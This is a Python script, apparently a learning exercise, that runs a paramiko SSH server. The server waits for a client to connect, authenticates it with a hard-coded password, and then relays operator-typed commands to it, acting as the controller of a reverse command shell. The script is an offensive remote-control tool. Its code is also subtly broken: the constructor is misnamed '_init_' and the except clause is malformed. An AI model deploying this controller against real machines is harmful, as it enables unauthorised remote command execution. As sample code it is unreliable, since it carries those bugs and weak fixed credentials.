import socket
import paramiko
import threading
import sys
import os

# using the key from paramiko demo files
host_key = paramiko.RSAKey(filename=os.path.join('/home', 'sjbavier','Reference', 'python', 'haX', 'keys', 'rsa_sha256')) # location of RSA public key

class Server (paramiko.ServerInterface):
    def _init_(self):
        self.event = threading.Event()

    # check the kind of channel opened by paramiko transport
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    # simple password check    
    def check_auth_password(self, username, password):
        if (username == 'userA') and (password == 'passwd'):
            return paramiko.AUTH_SUCCESSFUL
        # else failed
        return paramiko.AUTH_FAILED

# incorportate CLI arguments            
server = sys.argv[1]
ssh_port = int(sys.argv[2])

# try to listen for an incoming connection
try:
    # create socket stream with following options
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # bind the socket to the CLI arguments
    sock.bind((server, ssh_port))

    # listen for a connection with a backlog of 100
    sock.listen(100)
    print('[+] Listening for connection... ')

    # wait for a new connection and return socket
    client, addr = sock.accept()

except Exception as e:
    print('[-] Listen failed: ' + str(e))
    sys.exit(1)

print('[+] Got a connection!')

# once the connection is established create channel and command loop
try:
    # transport attaches to the socket
    # creates stream tunnels called channels
    bhSession = paramiko.Transport(client)

    # add host key
    bhSession.add_server_key(host_key)
    
    # create server
    server = Server()

    try:
        # start new SSH2 session server
        bhSession.start_server(server=server)
    except paramiko.SSHException() as x:
        print('[-] SSH negotiation failed.')
    # return a new channel will wait for 20 sec    
    chan = bhSession.accept(20)
    print('[+] Authenticated!')
    print(chan)
    print(chan.recv(1024).decode('utf-8'))
    chan.send('Welcome to bh_ssh')
    while True:
        try:
            command = input("Enter command: ").strip('\n')
            if command != 'exit':
                chan.send(command)
                print(chan.recv(1024).decode('utf-8') + '\n')
            else:
                chan.send('exit')
                print('exit')
                bhSession.close()
                raise Exception ('exit')
        except KeyboardInterrupt:
            bhSession.close()
except Exception as e:
    print('[-] Caught exception: ' + str(e))
    try:
        bhSession.close()
    except:
        pass
    sys.exit(1)